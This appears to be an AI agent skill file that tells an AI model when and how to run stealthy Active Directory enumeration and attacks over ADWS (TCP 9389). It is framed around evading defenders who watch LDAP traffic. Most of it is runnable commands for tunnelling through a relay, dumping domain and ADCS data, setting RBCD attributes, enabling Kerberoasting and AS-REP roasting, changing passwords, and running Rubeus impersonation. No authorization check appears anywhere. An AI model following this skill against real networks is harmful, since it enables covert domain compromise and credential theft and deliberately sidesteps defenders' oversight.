---
name: adws-enumeration
description: Active Directory Web Services (ADWS) enumeration and stealth collection over TCP 9389. Use this skill whenever the user needs to enumerate Active Directory, collect domain objects, perform LDAP-style queries, or gather BloodHound data in a stealthy manner. Trigger for AD recon, domain enumeration, ADCS collection, RBCD operations, or any scenario where traditional LDAP (389/636) might be monitored or filtered. Also use when the user mentions ADWS, port 9389, SoaPy, SOAPHound, or wants to enumerate AD from non-Windows hosts.
---

# ADWS Enumeration & Stealth Collection

Active Directory Web Services (ADWS) provides a stealthy alternative to traditional LDAP enumeration. ADWS is **enabled by default on every Domain Controller since Windows Server 2008 R2** and listens on TCP **9389**. Traffic is encapsulated in proprietary .NET framing protocols, making it less likely to be inspected or signatured than classic LDAP traffic.

## Why Use ADWS?

- **Stealthier recon** – Blue teams often concentrate on LDAP queries on ports 389/636
- **Cross-platform** – Collect from Linux/macOS hosts by tunneling 9389/TCP through SOCKS
- **Same data as LDAP** – Users, groups, ACLs, schema, security descriptors
- **Write operations** – Can modify attributes like `msDs-AllowedToActOnBehalfOfOtherIdentity` for RBCD
- **Blends with admin traffic** – Many RSAT GUI/PowerShell tools use ADWS

## Available Tools

### SoaPy (Python)

Full re-implementation of the ADWS protocol stack in pure Python. Best for targeted collection and write operations.

**Installation:**
```bash
python3 -m pip install soapy-adws
```

**Basic enumeration:**
```bash
soapy domain.local/user:password@dc.domain.local --users
soapy domain.local/user:password@dc.domain.local --computers
soapy domain.local/user:password@dc.domain.local --groups
```

**Targeted collection flags:**
- `--spns` – Find service principal names for Kerberoasting
- `--asreproastable` – Find accounts vulnerable to AS-REP roasting
- `--admins` – Find admin accounts
- `--constrained` / `--unconstrained` – Find delegation configurations
- `--rbcds` – Find RBCD-capable objects

**Custom queries:**
```bash
soapy domain.local/user:password@dc.domain.local \
      -q '(objectClass=user)' \
      -f samAccountName,servicePrincipalName \
      --parse
```

**Write operations:**
```bash
# Set RBCD attribute
soapy domain.local/user:password@dc.domain.local \
      --set 'CN=Victim,OU=Servers,DC=domain,DC=local' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'

# Set SPN for Kerberoasting
soapy domain.local/user:password@dc.domain.local \
      --spn 'HTTP/webserver' 'CN=Target,OU=Users,DC=domain,DC=local'

# Enable AS-REP roasting
soapy domain.local/user:password@dc.domain.local \
      --asrep 'CN=Target,OU=Users,DC=domain,DC=local'
```

**Proxy support (for C2 implants):**
```bash
export HTTPS_PROXY=socks5://127.0.0.1:1080
soapy domain.local/user:password@dc.domain.local --users
```

### SOAPHound (.NET)

High-volume ADWS collector that outputs BloodHound v4-compatible JSON. Best for complete domain dumps.

**Build cache (required for large forests):**
```powershell
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json
```

**BloodHound collection:**
```powershell
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output
```

**ADCS and DNS enrichment:**
```powershell
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

### ADWSDomainDump

Fork of ldapdomaindump that uses ADWS instead of LDAP.

**Installation:**
```bash
pipx install .
```

**Usage:**
```bash
adwsdomaindump -u 'domain\user' -p 'password' -n 10.10.10.1 dc.domain.local
```

### Sopa (Golang)

Generic ADWS client with full object lifecycle management.

**Common operations:**
```bash
# Search objects
sopa query -u user -p password -d domain.local -q '(objectClass=user)'

# Get specific object
sopa get -u user -p password -d domain.local -dn 'CN=Target,DC=domain,DC=local'

# Create user
sopa create user -u user -p password -d domain.local -n 'NewUser' -ou 'OU=Users,DC=domain,DC=local'

# Modify attributes
sopa attr replace -u user -p password -d domain.local \
      -dn 'CN=Target,DC=domain,DC=local' \
      -a 'servicePrincipalName' -v 'HTTP/webserver'

# Change password
sopa set-password -u user -p password -d domain.local \
      -dn 'CN=Target,DC=domain,DC=local' -new 'NewPassword123!'
```

## Stealth Collection Workflow

Follow this workflow to enumerate domain and ADCS objects over ADWS and convert to BloodHound format:

### Step 1: Tunnel to Port 9389

From your operator host, establish a tunnel to the target network:
```bash
# Using Chisel
chisel client <relay-ip>:8000 local:9389:10.2.10.10:9389

# Or SSH dynamic port forward
ssh -D 1080 user@jumpbox
export HTTPS_PROXY=socks5://127.0.0.1:1080
```

### Step 2: Collect Domain Objects

```bash
soapy domain.local/user:password@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

### Step 3: Collect ADCS Objects

```bash
soapy domain.local/user:password@10.2.10.10 \
      -dn 'CN=Configuration,DC=domain,DC=local' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

### Step 4: Convert to BloodHound

```bash
bofhound -i data --zip
```

### Step 5: Analyze in BloodHound

Upload the ZIP to BloodHound and run queries like:
```cypher
MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c
```

## Important Considerations

### EnumerationContext Timeout

ADWS contexts age out after ~30 minutes. For large forests:
- Use SOAPHound's `--autosplit` to shard queries by CN prefix
- Split custom queries into smaller batches
- Page results with `Pull` messages if using raw ADWS

### Security Descriptors

When requesting `nTSecurityDescriptor`, specify the `LDAP_SERVER_SD_FLAGS_OID` control to omit SACLs, otherwise ADWS drops the attribute.

### Tool Selection Guide

| Use Case | Recommended Tool |
|----------|------------------|
| Quick targeted queries | SoaPy |
| Complete domain dump | SOAPHound |
| Write operations | SoaPy or Sopa |
| BloodHound integration | SOAPHound + BOFHound |
| Cross-platform (Linux/macOS) | SoaPy |
| Windows-only high-volume | SOAPHound |
| Object lifecycle management | Sopa |

## Common Attack Paths

### Resource-Based Constrained Delegation (RBCD)

1. Find RBCD-capable objects:
   ```bash
   soapy domain.local/user:password@dc.domain.local --rbcds
   ```

2. Set the RBCD attribute:
   ```bash
   soapy domain.local/user:password@dc.domain.local \
         --set 'CN=Victim,OU=Servers,DC=domain,DC=local' \
         msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
   ```

3. Execute S4U2Proxy attack with Rubeus:
   ```powershell
   Rubeus.exe s4u /user:attacker /rc4:hash /impersonateuser:victim /msdsspn:HTTP/webserver /autodomain
   ```

### Kerberoasting

1. Find accounts with SPNs:
   ```bash
   soapy domain.local/user:password@dc.domain.local --spns
   ```

2. Request TGS tickets and crack offline.

### AS-REP Roasting

1. Find accounts without pre-auth:
   ```bash
   soapy domain.local/user:password@dc.domain.local --asreproastable
   ```

2. Request AS-REP and crack offline.

## References

- [SpecterOps – Make Sure to Use SOAP(y)](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [SoaPy GitHub](https://github.com/logangoins/soapy)
- [SOAPHound GitHub](https://github.com/FalconForceTeam/SOAPHound)
- [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [Sopa GitHub](https://github.com/Macmod/sopa)
- [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
